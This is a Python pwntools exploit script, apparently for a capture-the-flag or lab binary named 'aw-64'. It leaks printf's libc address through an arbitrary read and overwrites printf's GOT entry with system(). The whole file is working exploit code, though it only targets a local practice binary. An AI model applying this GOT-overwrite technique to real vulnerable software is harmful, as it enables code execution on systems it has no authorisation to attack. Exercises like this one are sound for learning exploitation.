#!/usr/bin/env python3
from pwn import ELF, context, info, p64, process

context.log_level = "info"
context.arch = "amd64"
context.bits = 64
context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./aw-64")
p = process(elf.path, env={"PATH": ".:/bin:/usr/bin"})
libc = elf.libc
printf_got = p.elf.got["printf"]

# input_func
# puts("How many bytes do you want to read (N, in decimal)?");
print(p.recvuntil("decimal)?\n"))
read_size = "8"
p.sendline(read_size)
# puts("What is the address that you want to read (A, in hexadexmial, e.g., 0xffffde01)?");
print(p.recvuntil("01)?\n"))
p.sendline(hex(printf_got))
# printf("Writing %lu bytes to %p\n", read_bytes, ptr);
print(p.recvline())
printf_real_addr = p.unpack()
info("printf_real_addr: " + hex(printf_real_addr))

# calculate the system address
printf_addr = libc.symbols["printf"]
system_addr = libc.symbols["system"]
target_address = printf_real_addr + (system_addr - printf_addr)
info("target: " + hex(target_address))

# write_func
# puts("How many bytes do you want to write (N, in decimal, max 128 bytes)?");
print(p.recvuntil("bytes)?\n"))
p.sendline("16")
# "What is the address that you want to write (A, in hexadexmial, e.g., 0xffffde01)?"
print(p.recvuntil(")?\n"))
p.sendline(hex(printf_got))
# "Please provide your input (MAX %d bytes)",
p.sendline(p64(target_address))
print(p.recvuntil("bytes)"))
p.close()
